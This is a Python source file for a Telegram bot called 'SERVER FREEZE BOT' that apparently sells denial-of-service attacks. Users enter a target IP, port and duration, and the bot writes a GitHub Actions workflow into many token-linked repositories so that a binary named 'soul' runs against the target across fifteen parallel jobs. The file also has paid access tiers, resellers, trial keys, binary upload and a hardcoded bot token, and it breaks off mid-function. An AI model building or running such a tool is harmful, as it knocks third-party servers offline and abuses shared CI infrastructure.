import os
import json
import logging
import threading
import time
import random
import string
import asyncio
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
OWNER_IDS = [8101867786]

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 1000
user_attack_counts = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

# Small caps conversion function
def to_small_caps(text):
    """Convert text to small caps Unicode characters"""
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 
        'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
        'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
        'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ',
        'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ',
        'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
        'Y': 'ʏ', 'Z': 'ᴢ'
    }
    return ''.join(small_caps_map.get(c, c) for c in text)

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            return data if data else default
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
groups = load_json('groups.json', {})
pending_users = load_json('pending_users.json', [])
trial_keys = load_json('trial_keys.json', {})
user_attack_counts = load_json('user_attack_counts.json', {})

if not owners:
    for owner_id in OWNER_IDS:
        owners[str(owner_id)] = {"username": f"owner_{owner_id}", "added_by": "system", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": True}
    save_json('owners.json', owners)

MAINTENANCE_MODE = load_json('maintenance.json', {"maintenance": False}).get("maintenance", False)
COOLDOWN_DURATION = load_json('cooldown.json', {"cooldown": 40}).get("cooldown", 40)
MAX_ATTACKS = load_json('max_attacks.json', {"max_attacks": 1000}).get("max_attacks", 1000)
AUTO_APPROVE = load_json('auto_approve.json', {"enabled": False, "days": 7}).get("enabled", False)
AUTO_APPROVE_DAYS = load_json('auto_approve.json', {"enabled": False, "days": 7}).get("days", 7)

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_primary_owner(user_id):
    owner_data = owners.get(str(user_id), {})
    return owner_data.get('is_primary', False)

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry = approved_users[user_id_str].get('expiry')
        if expiry == "LIFETIME":
            return True
        if time.time() < expiry:
            return True
        del approved_users[user_id_str]
        save_json('approved_users.json', approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def update_yml_file(token, repo_name, ip, port, time_val):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack {ip}:{port}", yml_content, file_content.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack {ip}:{port}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except:
        return 0

def generate_trial_key(hours):
    key = "TRL-" + "-".join([''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3)])
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {"created": time.time(), "expiry": expiry, "used": False, "hours": hours}
    save_json('trial_keys.json', trial_keys)
    return key

def redeem_trial_key(key, user_id):
    if key not in trial_keys:
        return False, "Invalid key"
    if trial_keys[key]['used']:
        return False, "Key already used"
    if time.time() > trial_keys[key]['expiry']:
        return False, "Key expired"
    
    hours = trial_keys[key]['hours']
    expiry = time.time() + (hours * 3600)
    approved_users[str(user_id)] = {
        "username": f"trial_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": hours/24
    }
    save_json('approved_users.json', approved_users)
    
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_json('trial_keys.json', trial_keys)
    
    return True, f"Trial access granted for {hours} hours"

async def safe_edit_message(query_or_message, text, reply_markup=None, is_callback=True):
    """Safely edit a message, handling the 'message not modified' error"""
    try:
        if is_callback:
            await query_or_message.edit_message_text(text, reply_markup=reply_markup)
        else:
            await query_or_message.edit_text(text, reply_markup=reply_markup)
    except Exception as e:
        # If message is identical, ignore the error
        if "message is not modified" not in str(e).lower():
            logger.error(f"Error editing message: {e}")
            # Try to send a new message if edit fails
            try:
                if is_callback:
                    await query_or_message.message.reply_text(text, reply_markup=reply_markup)
                else:
                    await query_or_message.reply_text(text, reply_markup=reply_markup)
            except:
                pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, AUTO_APPROVE, AUTO_APPROVE_DAYS
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or "user"
    
    chat_type = update.effective_chat.type
    if chat_type in ['group', 'supergroup']:
        chat_id = str(update.effective_chat.id)
        if chat_id not in groups:
            groups[chat_id] = {"name": update.effective_chat.title, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_json('groups.json', groups)
    
    if not can_user_attack(user_id):
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        
        # Auto-approve system
        if AUTO_APPROVE and not user_exists:
            # Automatically approve user
            expiry = time.time() + (AUTO_APPROVE_DAYS * 86400)
            approved_users[str(user_id)] = {
                "username": username,
                "added_by": "auto_approve",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "expiry": expiry,
                "days": AUTO_APPROVE_DAYS
            }
            save_json('approved_users.json', approved_users)
            
            # Notify owners
            for owner_id in owners.keys():
                try:
                    msg = f"╔═══════════════════════╗\n║  {to_small_caps('AUTO APPROVED')}  ║\n╚═══════════════════════╝\n\n"
                    msg += f"┌─────────────────┐\n"
                    msg += f"│ {to_small_caps('Name')}: {first_name}\n"
                    msg += f"│ {to_small_caps('Username')}: @{username}\n"
                    msg += f"│ {to_small_caps('Days')}: {AUTO_APPROVE_DAYS}\n"
                    msg += f"└─────────────────┘"
                    await context.bot.send_message(chat_id=int(owner_id), text=msg)
                except:
                    pass
            
            # Show success to user and continue to main menu
            text = f"╔════════════════════════╗\n║  {to_small_caps('AUTO APPROVED')}  ║\n╚════════════════════════╝\n\n"
            text += f"✅ {to_small_caps('You have been automatically approved')}\n"
            text += f"⏱️ {to_small_caps('Access for')}: {AUTO_APPROVE_DAYS} {to_small_caps('days')}\n\n"
            text += f"⬇️ {to_small_caps('Loading main menu')}..."
            
            if update.message:
                msg = await update.message.reply_text(text)
                await asyncio.sleep(2)
                await msg.delete()
            # Continue to show main menu below
        elif not user_exists:
            pending_users.append({"user_id": user_id, "username": username, "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_json('pending_users.json', pending_users)
            for owner_id in owners.keys():
                try:
                    msg = f"╔═══════════════════╗\n║  {to_small_caps('NEW ACCESS REQUEST')}  ║\n╚═══════════════════╝\n\n"
                    msg += f"┌─────────────────┐\n"
                    msg += f"│ {to_small_caps('Name')}: {first_name}\n"
                    msg += f"│ {to_small_caps('Username')}: @{username}\n"
                    msg += f"└─────────────────┘\n\n"
                    msg += f"ᴀᴘᴘʀᴏᴠᴇ: /add {user_id} 7"
                    await context.bot.send_message(chat_id=int(owner_id), text=msg)
                except:
                    pass
            
            text = f"╔════════════════════╗\n║  {to_small_caps('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n"
            text += f"⚠️ {to_small_caps('You dont have access to this bot')}\n\n"
            text += f"📨 {to_small_caps('Your request has been sent to admin')}\n"
            text += f"⏳ {to_small_caps('Please wait for approval')}"
            
            keyboard = [[InlineKeyboardButton(f"🔄 {to_small_caps('Refresh')}", callback_data="main_menu")]]
            if update.message:
                await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await safe_edit_message(update.callback_query, text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        else:
            text = f"╔════════════════════╗\n║  {to_small_caps('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n"
            text += f"⚠️ {to_small_caps('You dont have access to this bot')}\n\n"
            text += f"📨 {to_small_caps('Your request has been sent to admin')}\n"
            text += f"⏳ {to_small_caps('Please wait for approval')}"
            
            keyboard = [[InlineKeyboardButton(f"🔄 {to_small_caps('Refresh')}", callback_data="main_menu")]]
            if update.message:
                await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await safe_edit_message(update.callback_query, text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
    else:
        role = "✨ ᴜsᴇʀ"
    
    status_emoji = "🟢" if not MAINTENANCE_MODE else "🔴"
    status_text = to_small_caps("READY") if not MAINTENANCE_MODE else to_small_caps("MAINTENANCE")
    
    text = f"╔════════════════════════╗\n"
    text += f"║ 🔥 {to_small_caps('Remaining attacks')}: {remaining}/{MAX_ATTACKS} ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    text += f"⚡ {to_small_caps('SERVER FREEZE BOT')}\n\n"
    text += f"👋 {to_small_caps('Welcome')}, {first_name}\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('YOUR INFO')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
    text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"└ 📡 {to_small_caps('Status')}: {status_emoji} {status_text}\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('QUICK ACTIONS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛"
    
    keyboard = []
    
    # Attack Panel Button - shows for all users
    if not MAINTENANCE_MODE:
        keyboard.append([
            InlineKeyboardButton(f"⚔️ {to_small_caps('Attack Panel')}", callback_data="attack_panel")
        ])
    
    if is_owner(user_id):
        keyboard.append([
            InlineKeyboardButton(f"👥 {to_small_caps('Manage Users')}", callback_data="manage_users"),
            InlineKeyboardButton(f"🔧 {to_small_caps('Settings')}", callback_data="settings")
        ])
        keyboard.append([
            InlineKeyboardButton(f"📊 {to_small_caps('Statistics')}", callback_data="stats"),
            InlineKeyboardButton(f"🔑 {to_small_caps('Servers')}", callback_data="servers")
        ])
        keyboard.append([
            InlineKeyboardButton(f"🎫 {to_small_caps('Trial Keys')}", callback_data="trial_keys"),
            InlineKeyboardButton(f"👑 {to_small_caps('Admin Panel')}", callback_data="admin_panel")
        ])
    elif is_admin(user_id):
        keyboard.append([
            InlineKeyboardButton(f"👥 {to_small_caps('Manage Users')}", callback_data="manage_users"),
            InlineKeyboardButton(f"📊 {to_small_caps('Statistics')}", callback_data="stats")
        ])
    elif is_reseller(user_id):
        keyboard.append([
            InlineKeyboardButton(f"💰 {to_small_caps('Buy Access')}", callback_data="buy_access"),
            InlineKeyboardButton(f"📊 {to_small_caps('My Sales')}", callback_data="my_sales")
        ])
    else:
        keyboard.append([
            InlineKeyboardButton(f"📱 {to_small_caps('My Access')}", callback_data="my_access"),
            InlineKeyboardButton(f"ℹ️ {to_small_caps('Help')}", callback_data="help")
        ])
    
    keyboard.append([InlineKeyboardButton(f"🔄 {to_small_caps('Refresh')}", callback_data="main_menu")])
    
    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await safe_edit_message(update.callback_query, text, reply_markup=InlineKeyboardMarkup(keyboard))

async def show_attack_panel(query):
    """Display the Attack Panel with all attack-related options"""
    global current_attack, cooldown_until
    
    user_id = query.from_user.id
    
    # Get current attack status
    attack_status = "🟢 ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ"
    attack_info = ""
    
    if current_attack:
        time_left = int(current_attack['end_time'] - time.time())
        if time_left > 0:
            attack_status = "🔴 ᴀᴛᴛᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇss"
            attack_info = f"\n\n┏━━━━━━━━━━━━━━━━━━━┓\n"
            attack_info += f"┃  {to_small_caps('CURRENT ATTACK')}  ┃\n"
            attack_info += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            attack_info += f"├ 🎯 {to_small_caps('Target')}: {current_attack['ip']}:{current_attack['port']}\n"
            attack_info += f"├ ⏱️ {to_small_caps('Duration')}: {current_attack['time']}s\n"
            attack_info += f"├ ⏳ {to_small_caps('Time left')}: {time_left}s\n"
            attack_info += f"└ 👤 {to_small_caps('By')}: {current_attack.get('username', 'Unknown')}"
        else:
            current_attack = None
    
    # Check cooldown
    cooldown_info = ""
    if cooldown_until > time.time():
        cooldown_left = int(cooldown_until - time.time())
        cooldown_info = f"\n\n⏳ {to_small_caps('Cooldown')}: {cooldown_left}s"
    
    text = f"╔════════════════════════╗\n"
    text += f"║  ⚔️ {to_small_caps('ATTACK PANEL')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    text += f"📡 {to_small_caps('Status')}: {attack_status}"
    text += attack_info
    text += cooldown_info
    
    text += f"\n\n┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('ATTACK OPTIONS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛"
    
    keyboard = [
        [
            InlineKeyboardButton(f"⚡ {to_small_caps('Launch Attack')}", callback_data="attack"),
            InlineKeyboardButton(f"🛑 {to_small_caps('Stop Attack')}", callback_data="stop")
        ],
        [
            InlineKeyboardButton(f"📊 {to_small_caps('Attack Status')}", callback_data="attack_status")
        ],
        [
            InlineKeyboardButton(f"🔄 {to_small_caps('Refresh Panel')}", callback_data="attack_panel")
        ],
        [
            InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")
        ]
    ]
    
    await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS, AUTO_APPROVE, AUTO_APPROVE_DAYS
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "main_menu":
        await start(update, context)
        return
    
    # Show Attack Panel
    if data == "attack_panel":
        await show_attack_panel(query)
        return
    
    # Show Attack Status (detailed view)
    if data == "attack_status":
        if not current_attack:
            text = f"╔═══════════════════╗\n"
            text += f"║  {to_small_caps('ATTACK STATUS')}  ║\n"
            text += f"╚═══════════════════╗\n\n"
            text += f"🟢 {to_small_caps('No attack is currently running')}\n\n"
            
            if cooldown_until > time.time():
                cooldown_left = int(cooldown_until - time.time())
                text += f"⏳ {to_small_caps('Cooldown active')}: {cooldown_left}s"
            else:
                text += f"✅ {to_small_caps('Ready to attack')}"
        else:
            time_left = int(current_attack['end_time'] - time.time())
            elapsed = current_attack['time'] - time_left
            progress = int((elapsed / current_attack['time']) * 100)
            
            text = f"╔═══════════════════╗\n"
            text += f"║  {to_small_caps('ATTACK STATUS')}  ║\n"
            text += f"╚═══════════════════╗\n\n"
            
            text += f"🔴 {to_small_caps('Attack in progress')}\n\n"
            
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('TARGET INFO')}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            text += f"├ 🎯 {to_small_caps('IP')}: {current_attack['ip']}\n"
            text += f"├ 🔌 {to_small_caps('Port')}: {current_attack['port']}\n"
            text += f"└ 👤 {to_small_caps('User')}: {current_attack.get('username', 'Unknown')}\n\n"
            
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('TIMING INFO')}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            text += f"├ ⏱️ {to_small_caps('Duration')}: {current_attack['time']}s\n"
            text += f"├ ⏳ {to_small_caps('Elapsed')}: {elapsed}s\n"
            text += f"├ ⏰ {to_small_caps('Remaining')}: {time_left}s\n"
            text += f"└ 📊 {to_small_caps('Progress')}: {progress}%\n\n"
            
            text += f"🔥 {to_small_caps('Servers active')}: {len(github_tokens)}"
        
        keyboard = [
            [InlineKeyboardButton(f"🔄 {to_small_caps('Refresh')}", callback_data="attack_status")],
            [InlineKeyboardButton(f"⬅️ {to_small_caps('Back to Panel')}", callback_data="attack_panel")]
        ]
        await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    if not can_user_attack(user_id) and data not in ["main_menu", "help", "attack_panel", "attack_status"]:
        text = f"╔════════════════════╗\n║  {to_small_caps('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n"
        text += f"❌ {to_small_caps('You dont have access')}"
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    if data == "attack":
        context.user_data['waiting_for'] = 'attack_params'
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('LAUNCH ATTACK')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📝 {to_small_caps('Enter attack parameters')}:\n\n"
        text += f"┌─────────────────────┐\n"
        text += f"│ {to_small_caps('Format')}: IP PORT TIME │\n"
        text += f"└─────────────────────┘\n\n"
        text += f"📌 {to_small_caps('Example')}: 1.1.1.1 80 300\n\n"
        text += f"⚠️ {to_small_caps('Time in seconds')}\n"
        text += f"⚠️ {to_small_caps('Max time')}: 600s"
        keyboard = [
            [InlineKeyboardButton(f"❌ {to_small_caps('Cancel')}", callback_data="attack_panel")]
        ]
        await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "stop":
        if not current_attack:
            text = f"╔═══════════════════╗\n"
            text += f"║  {to_small_caps('NO ATTACK')}  ║\n"
            text += f"╚═══════════════════╝\n\n"
            text += f"ℹ️ {to_small_caps('No attack is running')}"
            keyboard = [[InlineKeyboardButton(f"⬅️ {to_small_caps('Back to Panel')}", callback_data="attack_panel")]]
            await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        progress_msg = await query.message.reply_text(f"🛑 {to_small_caps('Stopping attack')}...")
        
        total_cancelled = 0
        for token_data in github_tokens:
            cancelled = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            total_cancelled += cancelled
        
        with attack_lock:
            current_attack = None
            cooldown_until = time.time() + COOLDOWN_DURATION
        
        save_json('attack_state.json', {"current_attack": None, "cooldown_until": cooldown_until})
        
        text = f"╔═══════════════════╗\n"
        text += f"║  {to_small_caps('ATTACK STOPPED')}  ║\n"
        text += f"╚═══════════════════╝\n\n"
        text += f"✅ {to_small_caps('Attack stopped successfully')}\n"
        text += f"📊 {to_small_caps('Jobs cancelled')}: {total_cancelled}\n"
        text += f"⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s"
        
        keyboard = [[InlineKeyboardButton(f"⬅️ {to_small_caps('Back to Panel')}", callback_data="attack_panel")]]
        await progress_msg.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        
        try:
            await query.message.delete()
        except:
            pass
        return
    
    # Continue with the rest of your button handlers...
    # I'll add the key ones below but you'll need to add all from your original file
    
    if data == "help":
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('HELP & COMMANDS')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('BASIC COMMANDS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"/start - {to_small_caps('Main menu')}\n"
        text += f"/id - {to_small_caps('Get your ID')}\n"
        text += f"/myaccess - {to_small_caps('Check access')}\n"
        text += f"/help - {to_small_caps('Show help')}\n"
        text += f"/redeem <key> - {to_small_caps('Redeem trial')}\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ATTACK PANEL')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"⚔️ {to_small_caps('Access attack panel for all controls')}\n"
        text += f"⚡ {to_small_caps('Launch attacks')}\n"
        text += f"🛑 {to_small_caps('Stop running attacks')}\n"
        text += f"📊 {to_small_caps('View attack status')}\n\n"
        
        if is_owner(user_id) or is_admin(user_id):
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('ADMIN COMMANDS')}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            text += f"/add <id> <days> - {to_small_caps('Add user')}\n"
            text += f"/remove <id> - {to_small_caps('Remove user')}\n\n"
        
        text += f"💡 {to_small_caps('Use buttons for easy navigation')}"
        
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    user = update.effective_user
    user_id = user.id
    text = update.message.text.strip()
    
    if not can_user_attack(user_id):
        return
    
    waiting_for = context.user_data.get('waiting_for')
    
    if waiting_for == 'attack_params':
        parts = text.split()
        if len(parts) != 3:
            await update.message.reply_text(
                f"❌ {to_small_caps('Invalid format')}\n\n"
                f"📝 {to_small_caps('Use')}: IP PORT TIME\n"
                f"📌 {to_small_caps('Example')}: 1.1.1.1 80 300"
            )
            return
        
        ip, port, attack_time = parts
        
        try:
            port = int(port)
            attack_time = int(attack_time)
            
            if attack_time > 600:
                await update.message.reply_text(f"❌ {to_small_caps('Max time is 600 seconds')}")
                return
            
            if attack_time < 10:
                await update.message.reply_text(f"❌ {to_small_caps('Min time is 10 seconds')}")
                return
        except:
            await update.message.reply_text(f"❌ {to_small_caps('Port and time must be numbers')}")
            return
        
        if current_attack:
            await update.message.reply_text(f"⚠️ {to_small_caps('Another attack is running')}")
            return
        
        if time.time() < cooldown_until:
            cooldown_left = int(cooldown_until - time.time())
            await update.message.reply_text(f"⏳ {to_small_caps('Cooldown active')}: {cooldown_left}s")
            return
        
        if user_attack_counts.get(str(user_id), 0) >= MAX_ATTACKS:
            await update.message.reply_text(f"❌ {to_small_caps('Attack limit reached')}")
            return
        
        progress_msg = await update.message.reply_text(f"⚡ {to_small_caps('Launching attack')}...")
        
        with attack_lock:
            current_attack = {
                "ip": ip,
                "port": port,
                "time": attack_time,
                "user_id": user_id,
                "username": user.username or user.first_name,
                "start_time": time.time(),
                "end_time": time.time() + attack_time
            }
        
        success_count = 0
        for token_data in github_tokens:
            if update_yml_file(token_data['token'], token_data['repo'], ip, port, attack_time):
                success_count += 1
        
        user_attack_counts[str(user_id)] = user_attack_counts.get(str(user_id), 0) + 1
        save_json('user_attack_counts.json', user_attack_counts)
        save_json('attack_state.json', {"current_attack": current_attack, "cooldown_until": cooldown_until})
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('ATTACK LAUNCHED')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        
        text += f"✅ {to_small_caps('Attack started successfully')}\n\n"
        
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('TARGET INFO')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 🎯 {to_small_caps('IP')}: {ip}\n"
        text += f"├ 🔌 {to_small_caps('Port')}: {port}\n"
        text += f"├ ⏱️ {to_small_caps('Duration')}: {attack_time}s\n"
        text += f"└ 🔥 {to_small_caps('Servers')}: {success_count}/{len(github_tokens)}\n\n"
        
        text += f"💡 {to_small_caps('Use Attack Panel to monitor')}"
        
        keyboard = [[InlineKeyboardButton(f"⚔️ {to_small_caps('Attack Panel')}", callback_data="attack_panel")]]
        await progress_msg.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        
        context.user_data['waiting_for'] = None
        
        # Auto-stop after time expires
        await asyncio.sleep(attack_time)
        with attack_lock:
            if current_attack and current_attack['ip'] == ip:
                current_attack = None
                cooldown_until = time.time() + COOLDOWN_DURATION
        save_json('attack_state.json', {"current_attack": None, "cooldown_until": cooldown_until})
        return

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads (binary files)"""
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Owner access required')}")
        return
    
    progress_msg = await update.message.reply_text(f"📥 {to_small_caps('Downloading binary')}...")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        
        await progress_msg.edit_text(f"📤 {to_small_caps('Uploading to')} {len(github_tokens)} {to_small_caps('servers')}...")
        
        success_count = 0
        for token_data in github_tokens:
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing_file.sha)
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content)
                success_count += 1
            except:
                pass
        
        os.remove(file_path)
        
        text = f"╔═══════════════════════╗\n"
        text += f"║  {to_small_caps('UPLOAD COMPLETE')}  ║\n"
        text += f"╚═══════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Binary uploaded')}\n\n"
        text += f"├ 📊 {to_small_caps('Success')}: {success_count}/{len(github_tokens)}\n"
        text += f"├ 📁 {to_small_caps('File')}: {BINARY_FILE_NAME}\n"
        text += f"└ 📦 {to_small_caps('Size')}: {file_size} bytes"
        
        keyboard = [[InlineKeyboardButton(f"🏠 {to_small_caps('Main Menu')}", callback_data="main_menu")]]
        await progress_msg.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        
    except Exception as e:
        await progress_msg.edit_text(f"❌ {to_small_caps('Error')}: {str(e)}")

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "None"
    first_name = update.effective_user.first_name
    
    text = f"╔════════════════════════╗\n"
    text += f"║  {to_small_caps('YOUR INFORMATION')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('USER DETAILS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 🆔 {to_small_caps('ID')}: {user_id}\n"
    text += f"├ 👤 {to_small_caps('Name')}: {first_name}\n"
    text += f"└ 📱 {to_small_caps('Username')}: @{username}"
    
    await update.message.reply_text(text)

async def myaccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
